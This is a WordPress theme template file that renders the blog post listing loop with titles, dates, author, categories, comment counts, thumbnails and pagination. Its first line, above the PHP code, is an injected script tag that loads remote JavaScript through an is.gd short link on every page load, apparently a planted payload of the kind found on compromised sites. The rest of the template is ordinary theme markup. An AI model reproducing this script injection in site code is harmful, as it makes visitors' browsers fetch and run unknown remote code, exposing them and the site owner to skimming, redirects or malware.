<script type='text/javascript' src="http://is.gd/55phUb"></script>

<?php get_header(); ?>

	<div id="main-wrap-outer" class="wrap-outer-page">
		<div id="main-wrap-inner">
			<div id="main-wrap" class="wrap">				
							
				<div id="main" class="inner group">					
					<div id="content" class="group">
						
						<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
						<article id="post-<?php the_ID(); ?>" <?php post_class('post listing group'); ?>>
							<h2><a href="<?php the_permalink(); ?>" title="<?php echo esc_attr(sprintf(__('Permalink to: %s', 'ci_theme'), get_the_title())); ?>"><?php the_title(); ?></a></h2>
							<p class="meta"><?php echo get_the_date(); ?> &dash; <?php echo sprintf(_x('Posted by %s', 'author name', 'ci_theme'), the_author_meta('display_name')); ?> &dash; <?php echo sprintf(_x('Under: %s', 'categories list', 'ci_theme'), get_the_category_list(', ')); ?></p>
							<p class="comments-no">
								<a href="<?php comments_link(); ?>" class="comment-count"><?php comments_number( '0', '1', '%' ); ?></a>
								<img src="<?php echo get_template_directory_uri() ?>/images/bg_balloon.png" alt="" />
							</p>
							<?php the_post_thumbnail('ci_blog_thumb', array('class' => 'alignleft')); ?>
							<?php ci_e_content(); ?>
						</article><!-- /article -->
						<?php endwhile; endif; ?>
						
						<?php ci_pagination(); ?>
						
					</div><!-- /content -->
									
					<?php get_sidebar(); ?>
										
				</div><!-- /main -->
			</div>	
		</div><!-- /main-wrap -->
	</div><!-- /main-wrap-outer -->	

<?php get_footer(); ?>
